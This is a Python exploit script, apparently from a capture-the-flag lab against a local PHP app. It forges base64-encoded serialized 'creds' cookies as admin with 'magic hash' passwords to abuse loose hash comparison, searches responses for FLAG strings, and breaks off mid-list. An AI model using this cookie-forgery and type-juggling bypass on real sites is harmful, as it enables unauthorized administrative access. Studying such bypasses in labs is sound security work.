import requests
import base64
import re
import hashlib

base_url = "http://127.0.0.1:33063/index.php"

# The cookie contains base64(PHP serialize({username, password}))
# When the page reads the cookie, it shows "User: admin" but says "not the admin"
# This means: username check passes (from cookie), but password hash comparison fails
# The server likely: md5($password_from_cookie) == $stored_hash  (loose comparison)
# If stored hash is a 0e... magic hash, then we need our password to also MD5 to 0e...
# But our magic hash passwords aren't working, so maybe the hash algo is different (SHA1?)

# SHA1 magic hashes - strings that SHA1 to 0e... format
sha1_magic_passwords = [
    "aaroZmOb",       # sha1 = 0e6650701996942723362623290636110638774
    "aaK1STfY",       # sha1 = 0e7785220380375885795393117098224144684
    "aaO8zKZF",       # sha1 = 0e8966320130912687510616324175424488111
    "aa3DE9hD",       # sha1 = 0e...  
    "0e",             # test direct 0e
]

# Verify what these hash to
for p in sha1_magic_passwords:
    md5_hash = hashlib.md5(p.encode()).hexdigest()
    sha1_hash = hashlib.sha1(p.encode()).hexdigest()
    print(f"  {p}: md5={md5_hash}, sha1={sha1_hash}")

# Try SHA1 magic hashes as password in the cookie
print("\n[*] Testing SHA1 magic hash passwords with admin username in cookie")
print("-" * 60)

for password in sha1_magic_passwords:
    php_serialized = f'a:2:{{s:8:"username";s:5:"admin";s:8:"password";s:{len(password)}:"{password}";}}'
    cookie_value = base64.b64encode(php_serialized.encode()).decode()
    
    resp = requests.get(base_url, cookies={"creds": cookie_value})
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    is_admin = "you are not the admin" not in resp.text.lower()
    
    print(f"[password={password}] Is admin: {is_admin} | Flags: {flags}")
    if is_admin or flags:
        print(f"  FULL RESPONSE:")
        print(resp.text)

# Now let me think differently - the password in the cookie IS stored as plaintext
# The server probably reads the cookie, gets username and password, then:
# 1. Checks if username == "admin"
# 2. Hashes the password from cookie and compares with stored hash
# 3. If hash comparison passes -> admin

# What if the stored admin password hash is a magic hash itself?
# e.g., admin's password hash = 0e462097431906509019562988736854
# Then we need md5(our_password) == "0e462097431906509019562988736854" (loose comparison)
# This means md5(our_password) must start with "0e" and have only digits after
# The magic hash passwords DO produce 0e... hashes, so they should work IF the stored hash is also 0e...

# But they didn't work! Let me check if maybe the server is using a different comparison.
# Let me try: what if we put the hash value DIRECTLY as the password in the cookie?
# i.e., what if the server compares the password from the cookie directly with the stored hash?

print("\n\n[*] Testing: Put hash-like values directly as password in cookie")
print("-" * 60)

# Common 0e hash values that might be stored as admin password
hash_values = [
